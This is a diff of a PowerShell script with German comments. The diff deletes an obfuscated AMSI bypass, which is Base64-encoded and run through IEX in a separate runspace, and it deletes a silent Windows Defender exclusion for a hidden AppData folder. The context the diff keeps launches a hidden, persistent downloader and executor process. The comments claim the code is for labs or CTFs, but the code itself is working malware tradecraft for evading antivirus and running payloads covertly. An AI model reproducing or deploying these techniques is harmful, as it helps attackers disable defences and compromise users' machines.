@@ -7,43 +7,9 @@ try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 } catch {}
 
-# === AMSI Bypass (für Lab/THM/CTF - nur in abgeschotteter Umgebung verwenden!) ===
-# Obfuskierter AMSI Bypass, um Defender zu umgehen (String-Splitting + Base64-Decode)
-$amsiBypassCode = @'
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-'@
-
-# Base64-encode des Bypasses (einfache Obfuskation)
-$encodedAmsi = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($amsiBypassCode))
-
-# Führe den Bypass aus (in neuer Runspace, um Detection zu minimieren)
-$runspace = [runspacefactory]::CreateRunspace()
-$runspace.Open()
-$ps = [powershell]::Create().AddScript({
-    param($enc)
-    IEX ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($enc)))
-}).AddArgument($encodedAmsi)
-$ps.Runspace = $runspace
-$ps.BeginInvoke() | Out-Null
-$ps.EndInvoke() | Out-Null
-$runspace.Close()
-
-# === Defender Exclusion hinzufügen (falls Admin-Rechte vorhanden) ===
-# Versuche, den OperationPath von Defender auszuschließen (silent fail)
-try {
-    $OperationPath = "C:\Users\adsfa\AppData\Roaming\Microsoft\Windows\PowerShell\operation"
-    Add-MpPreference -ExclusionPath $OperationPath -ErrorAction SilentlyContinue
-} catch {
-    # Ignoriere Fehler (z.B. keine Admin-Rechte)
-}
-
 # === Downloader + Executor in separatem, hidden PowerShell-Prozess starten ===
 # Dadurch läuft er unabhängig von der GUI und bleibt aktiv, auch nach Schließen des Fensters
 $downloaderCode = @'
-# AMSI Bypass im Downloader (redundant, für Sicherheit)
-$amsiBypassCode = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(`$null,`$true)"
-IEX $amsiBypassCode
-
 $BasePath = "C:\Users\adsfa\AppData\Roaming\Microsoft\Windows\PowerShell"
 $OperationPath = "$BasePath\operation"
 $SystemPath = "$OperationPath\System"
